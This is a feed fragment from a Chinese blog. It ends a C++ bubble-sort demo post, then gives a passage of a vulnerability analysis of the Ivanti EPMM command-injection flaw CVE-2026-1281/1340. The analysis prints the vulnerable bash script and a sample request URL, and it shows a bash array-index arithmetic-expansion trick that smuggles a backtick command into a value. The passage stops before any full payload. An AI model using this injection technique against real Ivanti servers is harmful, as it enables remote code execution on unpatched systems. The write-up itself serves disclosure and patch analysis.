   <span style="color: rgba(0, 0, 255, 1)">for</span>(<span style="color: rgba(0, 0, 255, 1)">int</span> i=<span style="color: rgba(128, 0, 128, 1)">0</span>;i&lt;n;i++){    <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">å»ºç«nä¸ªèç¹ï¼æ¾å°datasä¸­</span>
      <span style="color: rgba(0, 0, 255, 1)">int</span> v = randint(<span style="color: rgba(128, 0, 128, 1)">30</span>,<span style="color: rgba(128, 0, 128, 1)">200</span><span style="color: rgba(0, 0, 0, 1)">);
      Node </span>*node = <span style="color: rgba(0, 0, 255, 1)">new</span><span style="color: rgba(0, 0, 0, 1)"> Node;
      node</span>-&gt;value =<span style="color: rgba(0, 0, 0, 1)"> v;
      node</span>-&gt;x =<span style="color: rgba(0, 0, 0, 1)"> x;
      </span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">æé¡ºåºéæ©ç´¢å¼ä¸ºiçé¢è²ï¼ç»åæè§è²çé åå¾ç</span>
      <span style="color: rgba(0, 0, 255, 1)">string</span> s = <span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">res/circle_</span><span style="color: rgba(128, 0, 0, 1)">"</span> + colors[i] + <span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">.png</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">;
      Sprite </span>*js = <span style="color: rgba(0, 0, 255, 1)">new</span> Sprite(s); <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">æ°å»ºè§è²ï¼ä»¥sä¸ºé å</span>
      js-&gt;scale(v/<span style="color: rgba(128, 0, 128, 1)">100.0</span>);        <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">æè§è²ç¼©å°ï¼è¦ä¸ç¶å¤ªå¤§äº</span>
      js-&gt;penup();  js-&gt;go(x,<span style="color: rgba(128, 0, 128, 1)">0</span>); js-&gt;speed(<span style="color: rgba(128, 0, 128, 1)">1</span>); <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">å®å¥½èµ·å§ä½ç½®</span>
      node-&gt;sp = js;             <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">èç¹åå«æè§è²æé</span>
<span style="color: rgba(0, 0, 0, 1)">      datas.push_back(node);      
      x </span>= x + <span style="color: rgba(128, 0, 128, 1)">100</span>;     <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">æ¯ä¸ªèç¹ç¸å·®100ä¸ªåä½</span>
<span style="color: rgba(0, 0, 0, 1)">   }
   Sprite pen{</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">blank</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">}; 
   pen.up().color(</span><span style="color: rgba(128, 0, 128, 1)">0</span>).sety(<span style="color: rgba(128, 0, 128, 1)">300</span>).write(<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">åæ³¡æåºç®æ³å¯è§åæ¼ç¤ºç¨åº</span><span style="color: rgba(128, 0, 0, 1)">"</span>,<span style="color: rgba(128, 0, 128, 1)">50</span><span style="color: rgba(0, 0, 0, 1)">);
   pen.color(</span><span style="color: rgba(128, 0, 128, 1)">30</span>).sety(<span style="color: rgba(128, 0, 128, 1)">230</span>).write(<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">ä½èï¼æå´ç,éç¨C++ç²¾çµåº</span><span style="color: rgba(128, 0, 0, 1)">"</span>,<span style="color: rgba(128, 0, 128, 1)">30</span><span style="color: rgba(0, 0, 0, 1)">);
   pen.color(</span><span style="color: rgba(128, 0, 128, 1)">60</span>).sety(<span style="color: rgba(128, 0, 128, 1)">180</span>).write(<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">C++ç²¾çµåºä½èï¼æå´ç</span><span style="color: rgba(128, 0, 0, 1)">"</span>,<span style="color: rgba(128, 0, 128, 1)">20</span><span style="color: rgba(0, 0, 0, 1)">);
   rocket.wait(</span><span style="color: rgba(128, 0, 128, 1)">1</span>).color(<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">yellow</span><span style="color: rgba(128, 0, 0, 1)">"</span>).penup().sety(<span style="color: rgba(128, 0, 128, 1)">130</span><span style="color: rgba(0, 0, 0, 1)">).hide();
   </span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">çæ­£çåæ³¡æåºæ ¸å¿ç¨åºå¼å§äº</span>
   <span style="color: rgba(0, 0, 255, 1)">for</span>(<span style="color: rgba(0, 0, 255, 1)">int</span> j=<span style="color: rgba(128, 0, 128, 1)">1</span>;j&lt;n;j++){  <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">æåºçæ ¸å¿ç¨åºå¨è¿é</span>
      <span style="color: rgba(0, 0, 255, 1)">string</span> s = <span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">ç¬¬ </span><span style="color: rgba(128, 0, 0, 1)">"</span> + to_string(j) + <span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)"> è½®</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">;    
      </span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">å é¤ææ©åçæå­ï¼ç¶ååä¸æ°çæå­ï¼å¹¶ä¸ç­å¾1ç§  </span>
      rocket.cleartxts(<span style="color: rgba(128, 0, 128, 1)">1</span>).write(s,<span style="color: rgba(128, 0, 128, 1)">42</span>).wait(<span style="color: rgba(128, 0, 128, 1)">1</span><span style="color: rgba(0, 0, 0, 1)">);
      </span><span style="color: rgba(0, 0, 255, 1)">for</span>(<span style="color: rgba(0, 0, 255, 1)">int</span> i=<span style="color: rgba(128, 0, 128, 1)">0</span>;i&lt;n-j;i++<span style="color: rgba(0, 0, 0, 1)">)   
         </span><span style="color: rgba(0, 0, 255, 1)">if</span>(datas[i]-&gt;value &gt; datas[i+<span style="color: rgba(128, 0, 128, 1)">1</span>]-&gt;value ) <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">åç°æ´å¤§çï¼åäº¤æ¢</span>
             swap(i,i+<span style="color: rgba(128, 0, 128, 1)">1</span><span style="color: rgba(0, 0, 0, 1)">);
      rocket.wait(</span><span style="color: rgba(128, 0, 128, 1)">1</span><span style="color: rgba(0, 0, 0, 1)">);
   }
   rocket.cleartxts(</span><span style="color: rgba(128, 0, 128, 1)">1</span>).write(<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">æ¼ç¤ºå®æ¯ï¼</span><span style="color: rgba(128, 0, 0, 1)">"</span>,<span style="color: rgba(128, 0, 128, 1)">42</span>).done();     <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">å®æäº</span>
   <span style="color: rgba(0, 0, 255, 1)">return</span> <span style="color: rgba(128, 0, 128, 1)">0</span>;    <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">è¿å0</span>
}</pre>
</div>
<p>&nbsp;</p>

</div>
<div class="clear"></div>

	<div class="postDesc">posted on 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-02-02 20:14">2026-02-02 20:13</span>&nbsp;
<a href="https://www.cnblogs.com/lixingqiu">æå´ç</a>&nbsp;
éè¯»(<span id="post_view_count">32</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19566285);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19566285', targetLink: 'https://www.cnblogs.com/lixingqiu/p/19566285', title: 'ä¸ä¸ªææçç¼ç¨æå®¤ï¼çµèå±å¹ååçä¸ä½ç¨åºåï¼ä½ ï¼ï¼æè¾¹ç«çä¸ä½å¥½å¥çæåã' })">ä¸¾æ¥</a>
</div>
 ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ Ivanti EPMM RCE CVE-2026-1340/1281å®æ´åæ ]]></title>
    <link>https://www.cnblogs.com/mhtsec/p/19566043</link>
    <guid>0491d1702c6f689fe356f69d257a261b</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/mhtsec/p/19566043" title="åå¸äº 2026-02-02 18:41">
    <span role="heading" aria-level="2">Ivanti EPMM RCE CVE-2026-1340/1281å®æ´åæ</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h2 id="åè¨">åè¨ï¼</h2>
<p>æä¸­ææ¯åæä»ä¾äº¤æµè®¨è®ºï¼pocä»ä¾åæ³æµè¯ï¼ç¨äºä¼ä¸èªæ¥ï¼åå¿ç¨äºéæ³æµè¯ï¼æªæææµè¯é æåæç±ä½¿ç¨èæ¿æï¼ä¸æ¬å¬ä¼å·ä»¥åæ£è±ç³æ å³ã</p>
<h2 id="ä»ç»">ä»ç»ï¼</h2>
<p>è¿æ¥,Ivantiå¬å¸æ«é²äºIvanti Endpoint Manager Mobile (EPMM)ä¸­å­å¨çä»£ç æ³¨å¥æ¼æ´(<strong>CVE-2026-1281</strong>å<strong>CVE-2026-1340</strong>)ï¼å¹¶ç¡®è®¤<strong>å·²å­å¨å¨éå©ç¨</strong>ãè¯¥æ¼æ´æºäº Apache HTTPd è°ç¨ç Bash èæ¬å¨å¤çæ¶é´æ³æ¯è¾æ¶ï¼æªè½ææè¿æ»¤æ¶æåæ°ï¼å¯¼è´æ»å»èå¯å©ç¨ Bash ç®æ¯æ©å±ç¹æ§æ³¨å¥ç³»ç»å½ä»¤ã</p>
<h2 id="åæ">åæï¼</h2>
<p>é¦åæ¿å°è¡¥ä¸å</p>
<p><img alt="" loading="lazy" data-src="https://oss.bdziyi.com/biji/202602021209948.png" class="lazyload"></p>
<p>RPMçåé£å°±å¥½åäºï¼ç´æ¥æ¥çå®æ§è¡äºä»ä¹å³å¯ï¼ä½¿ç¨å½ä»¤ï¼</p>
<pre><code>rpm -qp --scripts ivanti-security-update-1761642-1.0.0L-5.noarch.rpm
</code></pre>
<p><img alt="" loading="lazy" data-src="https://oss.bdziyi.com/biji/202602021210121.png" class="lazyload"></p>
<p>emmmåå®¹æç¹å¤ï¼ä¸è¿æ ¹æ®å·²ç¥æ¡ä»¶ï¼è¯¥æ¼æ´æºäº Apache HTTPd ï¼è¡¥ä¸åéé¢å¾å®¹æçå°å³é®çä¿®æ¹Apache HTTPdéç½®çå½ä»¤ï¼</p>
<pre><code>/bin/sed -i \
  -e 's|RewriteMap mapAppStoreURL prg:/mi/bin/map-appstore-url|RewriteMap mapAppStoreURL "prg:/bin/java -cp /mi/bin AppStoreUrlMapper"|g' \
  -e 's|RewriteMap mapAftStoreURL prg:/mi/bin/map-aft-store-url|RewriteMap mapAftStoreURL "prg:/bin/java -cp /mi/bin AFTUrlMapper"|g' \
  /etc/httpd/conf.d/ssl.conf
</code></pre>
<p>å°±æ¯è¯´æ<code>map-appstore-url</code>å<code>map-aft-store-url</code>ç»æ¢æäºä¸ç¨æ¯å§ï¼okæä»¬å»ççè¿ä¿©èæ¬æ¯ä»ä¹ï¼ç®å½å·²ç»ç»äºå¨mi/binä¸ï¼æä»¬ç´æ¥è¿ç»ç«¯æ¥ä¸ä¸</p>
<p><img alt="" loading="lazy" data-src="https://oss.bdziyi.com/biji/202602021216970.png" class="lazyload"></p>
<p>map-appstore-urlåmap-aft-store-urlæ¯ä¸ªbashèæ¬ï¼catå°±å¯ä»¥ç´æ¥çåå®¹(å¦ä¸ä¸ªèæ¬åå®¹å·®ä¸å¤ªå¤ï¼å°±ä¸å±ç¤ºäº)ã</p>
<pre><code>#!/bin/bash

set -o nounset

declare -x MI_DATE_COMMAND="date +%Y-%m-%d--%H-%M-%S"
declare -x MI_DATE_FORMAT="%Y-%m-%d--%H-%M-%S"

declare -r kScriptName=$(basename $0)
declare -r kScriptDirectory=$(dirname $0)
declare -r kLogFile="/var/log/${kScriptName}.log"
declare -r kSaltFile="/mi/files/appstore-salt.txt"

declare -r kScriptStartTimeSeconds=$(date +%s)
declare -r kValidTimeStampLength=${#kScriptStartTimeSeconds}

declare -r kAftFileStoreDirectory='/mi/files/aftstore'

# error codes that are used in /etc/httpd/conf.d/ssl.conf
declare -r kPathTraversalAttemptedErrorCode="c91bbeec40aff3fd3fe0c08044c1165a"
declare -r kLinkHashMismatchErrorCode="44b2ff3cf69c5112061aad51e0f7d772"
declare -r kTooLateErrorCode="c6a0e7ca11208b4f11d04a7ee8151a46"
declare -r kTooEarlyErrorCode="80862895184bfa4d00b24d4fbb3d942f"
declare -r kKeyIndexOutOfBoundsErrorCode="f74c27fce7d8e2fecd10ab54eda6bd85"
declare -r kURLStructureInvalidErrorCode="b702087a848177d489a6891bd7869495"
declare -r kTimestampLengthInvalidErrorCode="2ecad569fdaa07e2b66ed2595cf7240f"
declare -r kLinkSpoofErrorCode="cbfa488e9b08d4c5d7b3b2084ffb18e7"
declare -r kLinkUsingOddTraversalErrorCode="f489b91db387b684f56c07e7f5e4308b"

gShouldLogToFile="false"
gSaltFileModificationTime="0"
gTestMode="false"
gErrorCode=0
gErrorMessage=""
declare -a gSaltArray=( )
gCurrentSalt=""
gHostname=""
gPath=""
gStartTime=""
gEndTime=""

if (( $# &gt; 0 )) ; then
  gTestMode="true"
fi

#echo "gTestMode=${gTestMode}"

# information
function log() {
  if ${gTestMode} ; then
    echo "`$MI_DATE_COMMAND` -- ${kScriptName} -- ${1}: ${@:2}"
  else
    # do not log since it kills performance
    echo "$($MI_DATE_COMMAND) -- ${kScriptName} -- ${1}: ${@:2}" &gt;&gt; ${kLogFile}
  fi
}

function logDebug() {
  if ${gTestMode} ; then
    echo "`$MI_DATE_COMMAND` -- ${kScriptName} -- ${1}: ${@:2}"
  else
    # do not log since it kills performance
    ${gShouldLogToFile} &amp;&amp; echo "$($MI_DATE_COMMAND) -- ${kScriptName} -- ${1}: ${@:2}" &gt;&gt; ${kLogFile}
  fi
}

# errorCode
# information
function logDenial() {
  local theCurrentDate="$(MI_DATE_COMMAND)"
  if ${gTestMode} ; then
    echo "$theCurrentDate -- ${kScriptName} -- ${1}: denying: errorCode=${2}: ${@:3}"
  else
    #echo "$theCurrentDate -- ${kScriptName} -- ${1}: denying: errorCode=${2}: ${@:3}" &gt;&gt; "${kLogFile}"
    logger -t "${kScriptName}" -i -p local0.warning "$theCurrentDate -- ${1}: denying: errorCode=${2}: ${@:3}"
  fi
}

log "MAIN" "starting"

function dumpSaltArray() {
  log "${FUNCNAME}" "entered"

  for theSalt in "${gSaltArray[@]}" ; do
    log "${FUNCNAME}" "theSalt=$theSalt"
  done
}

log "MAIN" "after dumpSaltArray declaration"

function readSaltFile() {
  if [[ -f "${kSaltFile}" ]] ; then
    theCurrentSaltModificationTime=$(stat -c %Y "${kSaltFile}")
    logDebug "${FUNCNAME}" "theCurrentSaltModificationTime=${theCurrentSaltModificationTime}"
    theDeltaTime=$(($theCurrentSaltModificationTime - $gSaltFileModificationTime))
    logDebug "${FUNCNAME}" "theDeltaTime=${theDeltaTime}"

    if [[ "${theDeltaTime}" -ne 0 ]] ; then
      log "${FUNCNAME}" "theDeltaTime=${theDeltaTime} not zero; loading salt from kSaltFile=${kSaltFile}"
      gSaltArray=( $(cat ${kSaltFile}))
      gSaltArray[0]=""
      gSaltFileModificationTime=$theCurrentSaltModificationTime
    fi
  else
    log "${FUNCNAME}" "kSaltFile=${kSaltFile} not found"
  fi
}

log "MAIN" "after readSaltFile declaration"

#readSaltFile
#dumpSaltArray
#readSaltFile

function lookupSaltByIndex() {
#echo "$1 ${#gSaltArray[*]}"
  if [ "$1" -lt ${#gSaltArray[*]} ] ; then
    gCurrentSalt=${gSaltArray[$1]}
  else
    gCurrentSalt=""
  fi

  logDebug "${FUNCNAME}" "theKeyIndex=$1; gCurrentSalt=$gCurrentSalt"
}

log "MAIN" "after lookupSaltByIndex declaration"

function verifyURLConsistency () {
  logDebug "${FUNCNAME}" "${1}"
  local ret="" # this is what we eventually echo and it's the name of a file for httpd to send to the client or a pattern that Rewrite is aware of and kill the connection with the right HTTP error code
  #theAppStoreString=${1%%:*}
  #echo "${theAppStoreString}"
  #declare
  theOldIFS="${IFS}"
  local theArgumentArray

  # process what httpd gave us in $1 splitting on the _
  IFS="_" &amp;&amp; theArgumentArray=(${1})

  theAftStoreString=${theArgumentArray[0]}
  theAftStoreAssetGUIDWithExtension=${theArgumentArray[1]}
  gHostname=${theArgumentArray[2]}
  theURLString=${theArgumentArray[3]}
  #echo "${theAftStoreString}"

  # process what mifs really gave us in $1 splitting on the ,
  IFS="," &amp;&amp; theAftStoreKeyValueArray=(${theAftStoreString})

  IFS="${theOldIFS}"

  if (( ${#theArgumentArray[@]} != 4 )) ; then
    ret="${kURLStructureInvalidErrorCode}"
    log "${FUNCNAME}" "${ret}" "expecting 5 segments; actual=${#theArgumentArray[@]}"
  fi

  if [[ -z ${ret} ]] ; then
    for theKeyMapEntry in "${theAftStoreKeyValueArray[@]}" ; do
      theKey="${theKeyMapEntry%%=*}"
      theValue="${theKeyMapEntry##*=}"
      logDebug "${FUNCNAME}" "theKey=$theKey; theValue=$theValue"

      case ${theKey} in
        kid)
          gKeyIndex="${theValue}"
          ;;
        st)
          gStartTime="${theValue}"
          if (( ${#gStartTime} != "${kValidTimeStampLength}" )) ; then
            ret="${kTimestampLengthInvalidErrorCode}"
          fi
          ;;
        et)
          gEndTime="${theValue}"
          if (( ${#gEndTime} != "${kValidTimeStampLength}" )) ; then
            ret="${kTimestampLengthInvalidErrorCode}"
          fi
          ;;
        h)
          gHashPrefixString="${theValue}"
          ;;
        *)
          ret="${kURLStructureInvalidErrorCode}"
          logDenial "${FUNCNAME}" "${ret}" "unknown presented key=${theKey}; theValue=${theValue}"
          ;;
      esac
    done
  fi

  if [[ -z ${ret} ]] ; then
    lookupSaltByIndex ${gKeyIndex}

    if [[ -n "${gCurrentSalt}" ]] ; then
      logDebug "${FUNCNAME}" "continuing: gCurrentSalt=$gCurrentSalt"
      theCurrentTimeSeconds=$(date +%s)
      logDebug "${FUNCNAME}" "theCurrentTimeSeconds=${theCurrentTimeSeconds}"
      #theCurrentTimeSeconds=1336011206
      #theCurrentTimeSeconds=1336770818
      #gHostname="cot-0000001.mobileiron.com"
      #gHostname="qa42.mobileiron.com"

      if [[ ${theCurrentTimeSeconds} -gt ${gStartTime} ]] ; then
        logDebug "${FUNCNAME}" "continuing: not too early"

        if [[ ${theCurrentTimeSeconds} -lt ${gEndTime} ]] ; then
          logDebug "${FUNCNAME}" "continuing: not too late"

          # calculate the path
          gPath=${theURLString/\/sha256:${theAftStoreString}/}
          theStringToHash="${gCurrentSalt}${gHostname}${gPath}${gStartTime}${gEndTime}"
          theAssetFile="${theAftStoreAssetGUIDWithExtension}"
          # the string to hash must end with the assetfile start end
          logDebug "${FUNCNAME}" "theStringToHash=${theStringToHash}"

          if [[ "${theStringToHash}" = *"${theAssetFile}${gStartTime}${gEndTime}" ]] ; then
            theSHA256Hash=$(echo -n "${theStringToHash}" | sha256sum)
            theSHA256Prefix=${theSHA256Hash:0:64}
            # theSHA256Prefix=${theSHA256Hash}
            logDebug "${FUNCNAME}" "theSHA256Hash=$theSHA256Hash; theSHA256Prefix=$theSHA256Prefix"

shopt -s nocasematch
            if [[ "${theSHA256Prefix}" = "${gHashPrefixString}" ]] ; then
              logDebug "${FUNCNAME}" "hash matched"

              if [[ "${theAssetFile}" = *..* ]] || [[ "${theAssetFile}" = .* ]] || [[ "${theAssetFile}" = /* ]]; then
                ret="${kPathTraversalAttemptedErrorCode}"
                logDenial "${FUNCNAME}" "${ret}" "getting spoofed: ${theAssetFile}"
              else
                ret="${kAftFileStoreDirectory}"/"${theAftStoreAssetGUIDWithExtension}"
              fi
            else
              ret="${kLinkHashMismatchErrorCode}"
              logDenial "${FUNCNAME}" "${ret}" "link hash mismatch: theSHA256Prefix=$theSHA256Prefix; gHashPrefixString=${gHashPrefixString}; ${1}"
            fi
          else
            ret="${kLinkSpoofErrorCode}"
            logDenial "${FUNCNAME}" "${ret}" "link being spoofed: theStringToHash=${theStringToHash}; requiredSuffix=${theAppStoreSubDirectory}/${theAppStoreAssetGUID}${theAppStoreAssetExtension}${gStartTime}${gEndTime}; ${1}"
          fi
shopt -u nocasematch
        else
          ret="${kTooLateErrorCode}"
          logDenial "${FUNCNAME}" "${ret}" "link too late: theCurrentTimeSeconds=${theCurrentTimeSeconds}; ${1}"
        fi
      else
        ret="${kTooEarlyErrorCode}"
        logDenial "${FUNCNAME}" "${ret}" "link too early: theCurrentTimeSeconds=${theCurrentTimeSeconds}; ${1}"
      fi
    else
      ret="${kKeyIndexOutOfBoundsErrorCode}"
      logDenial "${FUNCNAME}" "${ret}" "key index out of bounds: ${1}"
    fi
  else
    ret="${kURLStructureInvalidErrorCode}"
    logDenial "${FUNCNAME}" "${ret}" "URL not structurally correct: ${1}"
  fi
  # tell httpd what file to send (or error message)
  echo "${ret}"
}

if ${gTestMode} ; then
  readSaltFile
  verifyURLConsistency "${1}"
else
  logDebug "MAIN" looping
  readSaltFile

  while read theCurrentLine; do
    readSaltFile
    logDebug "MAIN" "${theCurrentLine}"
    verifyURLConsistency "${theCurrentLine}"
  done
fi


</code></pre>
<p>ä½åå®¹å¤ªå¤äºï¼æä»¬è¿æ¯è¯·AIèå¸å¸®æä»¬ç»ä¸åæä¸ä¸</p>
<p><img alt="" loading="lazy" data-src="https://oss.bdziyi.com/biji/202602021237941.png" class="lazyload"></p>
<p>AIèå¸å¸®æä»¬åæå¹¶å¾å°äºä¸ä¸ªä¼ åè¯·æ±ï¼ç¶åæä»¬è¿å¾å»apacheçéç½®æä»¶ççå¥å£è·¯å¾æ¯ä»ä¹ï¼å¨/etc/httpd/conf.d/ssl.confæä»¶ä¸­æ¾æ¾ç¸å³çåå®¹,ç±äºéç½®æä»¶åå®¹å¤ªå¤äºè¿éå°±ä¸è´´äºï¼æä¹æå¾æ¾ï¼è¿æ¯è®©AIèå¸å¸®æä»¬æ¾æ¾å§ã</p>
<p><img alt="" loading="lazy" data-src="https://oss.bdziyi.com/biji/202602021246450.png" class="lazyload"></p>
<p>deepseekèå¸è¿æ¯å¤ªåè§£äººæäºï¼ç´æ¥ç»äºä¸ä¸ªæ åè¯·æ±ï¼</p>
<pre><code>/mifs/c/appstore/fob/3/1120/sha256:kid=1,st=1666663066,et=1666670266,h=a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2/75dc90fe-6ae7-4377-913b-7248334d39dc.ipa
</code></pre>
<p>ä½è¿äºä¼ åå°bashä¸­ï¼å¹¶æ²¡ææ¾å°ææ¾çç´æ¥å½ä»¤æ§è¡çç¹ï¼è¿æ¶æä»¬éè¦åçè§£ä¸ä¸bashèæ¬ï¼é¦åçbashèæ¬ä¸­çå¼å¤´ï¼</p>
<pre><code>gKeyIndex=""
gStartTime=""
gEndTime=""
gHashPrefixString=""
gPath=""

IFS=',' read -ra theAppStoreKeyValueArray
</code></pre>
<p>èæ¬ä¼ç¨ <code>IFS=','</code> æä¼ å¥çåæ°åå²ææ°ç» <code>theAppStoreKeyValueArray</code>ï¼ä¼ ååæ¯è¿æ ·çæ°ç»ï¼</p>
<pre><code>["kid=1", "st=1444444444", "et=1444444444", "h=a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2"]
</code></pre>
<p>ç¶åå¨ä¸æ¹æè¿æ ·çä¸æ®µå¾ªç¯ï¼</p>
<pre><code>  if [[ -z ${ret} ]] ; then
    for theKeyMapEntry in "${theAftStoreKeyValueArray[@]}" ; do
      theKey="${theKeyMapEntry%%=*}"
      theValue="${theKeyMapEntry##*=}"
</code></pre>
<p>å®æä¼ åçè¿äºåæ°ååå¼å¾ªç¯èµå¼ç»äºtheKeyåtheValueï¼ç¶ååè¢«èµå¼å°å¨å±åégKeyIndexãgStartTimeãgEndTimeãgHashPrefixStringä¸­ï¼ç»§ç»­è·ä¸å»ï¼ççè¿äºå¼å¨åªéç¨å°ã</p>
<p>keyåæ°èµå¼å°äºåégKeyIndexï¼æç»å¨è¿éåºç¨ï¼</p>
<pre><code>kAppStoreSaltFile="/mi/files/appstore-salt.txt"
gSalt="" 

if [[ -f ${kAppStoreSaltFile} ]]; then
  gSalt=$(sed -n "${gKeyIndex}p" "${kAppStoreSaltFile}")
  if [[ -z ${gSalt} ]]; then
    ret="${kSaltIndexInvalidErrorCode}"
    logDenial "${FUNCNAME}" "${ret}" "kid(${gKeyIndex}) is invalid (no salt found)"
  fi
else
  ret="${kSaltFileMissingErrorCode}"
  logDenial "${FUNCNAME}" "${ret}" "Salt file ${kAppStoreSaltFile} not found"
fi
</code></pre>
<p>å®æ¯ç¨æ¥è¯»å/mi/files/appstore-salt.txtå¯¹åºè¡çï¼è¿ä¸ªæä»¶éé¢çhashå¼è¯»ååºæ¥ç¨æ¥æ ¡éªåç»­åæ°ã</p>
<p>st åæ°æç»èµå¼ç»äºgStartTimeï¼åå«å¨ä¸¤ä¸ªå°æ¹è¢«è°ç¨ï¼</p>
<pre><code>kValidTimeStampLength=10 

case ${theKey} in
  st)
    gStartTime="${theValue}"
    if (( ${#gStartTime} != "${kValidTimeStampLength}" )); then
      ret="${kTimestampLengthInvalidErrorCode}"
    fi
    ;;
</code></pre>
<p>è¿éå¤æ­äºè¿ä¸ªåæ°æ¯å¦é¿åº¦ä¸º10ã</p>
<pre><code>theCurrentTimeSeconds=$(date +%s)

if [[ ${theCurrentTimeSeconds} -gt ${gStartTime} ]]; then
  logDebug "${FUNCNAME}" "Current time(${theCurrentTimeSeconds}) &gt; start time(${gStartTime})"
  # ... 
else
  ret="${kRequestExpiredErrorCode}"
  logDenial "${FUNCNAME}" "${ret}" "Start time(${gStartTime}) is in the future"
fi
</code></pre>
<p>è¿éç¨æ¥æ¯è¾å½åæ¶é´æ¯å¦æäºè¯·æ±å¼å§æ¶é´ã</p>
<p>et åæ°ï¼gEndTimeï¼ågStartTimeçç¨å¤å·®ä¸å¤ï¼ä¹æ ¡éªäºé¿åº¦åç¨äºéªè¯å½åæ¶é´â¤ç»ææ¶é´ã</p>
<p>h åæ°ï¼gHashPrefixStringï¼æ¯ç¨äºhashæ ¡éªçå¼ã</p>
<p>çä¸å»è¿æ¯æ²¡æç´è§çå½ä»¤æ§è¡çä»£ç ï¼å«æ¥ï¼æä»¬åå¼å¥ä¸ä¸ªç¥è¯ç¹ã</p>
<p>é¦åç»å¤§å®¶çä¸ä¸ªèæ¬ï¼</p>
<pre><code>#!/bin/bash
arr="" 
var="arr[`echo 'hacked' &gt; ./hack_mht`0]"
[[ 1 -gt $var ]] 

if [[ -f ./hack_mht ]]; then
    echo "æ§è¡æåï¼"
else
    echo "æªæ§è¡"
fi
</code></pre>
<p>broä»¬è§å¾è¿ä¸ªèæ¬è½æåæ§è¡å½ä»¤åï¼</p>
<p>ç­æ¡ï¼</p>
<p><img alt="" loading="lazy" data-src="https://oss.bdziyi.com/biji/202602021410761.png" class="lazyload"></p>
<p>ä¸ºä»ä¹ä¼è¿æ ·æï¼å ä¸ºå¨bashä¸­ï¼æ°å¼æ¯è¾åè½å¯ä»¥è§£æarray[index]è¿æ ·çæ°å¼ç´¢å¼ï¼indexä¼è¢«ä¼åè§£æä¸ºç®æ°è¡¨è¾¾å¼ï¼æ¯å¦array[1+1]ï¼ä¼åè®¡ç®1+1ï¼èbashåæä¸ä¸ªå½ä»¤æ¿æ¢çä¼åçº§è§åï¼å¦æä½ æarray[1+1]æ¹ä¸º</p>
<pre><code>array[`echo 111`]
</code></pre>
<p>ååæ§è¡è¢«åå¼å·åè£¹çå½ä»¤ï¼ä¸¾ä¾ï¼</p>
<pre><code>current_date=`date`
echo "ä»å¤©æ¯: $current_date"
echo "å½åç®å½: `pwd`"
</code></pre>
<p>æ¾ç¶å¨if [[ ${theCurrentTimeSeconds} -gt ${gStartTime} ]]; åif [[ ${theCurrentTimeSeconds} -lt ${gEndTime} ]] ; ä¸­é½å­å¨è¿ä¸ªæ¡ä»¶ï¼ä½æä»¬ä¹åè¯´äºï¼gStartTimeågEndTimeé½åäºé¿åº¦æ ¡éªçï¼å¿é¡»ä¸ºåä½ï¼è¿å°±å¾é¸¡èäºï¼é£æä¹æ ·æè½ç»è¿è¿ä¸ªé®é¢å¢ï¼</p>
<p>åå°æå¼å§çå®ä¹åéä¸å¾ªç¯ï¼</p>
<pre><code>  if [[ -z ${ret} ]] ; then
    for theKeyMapEntry in "${theAftStoreKeyValueArray[@]}" ; do
      theKey="${theKeyMapEntry%%=*}"
      theValue="${theKeyMapEntry##*=}"
</code></pre>
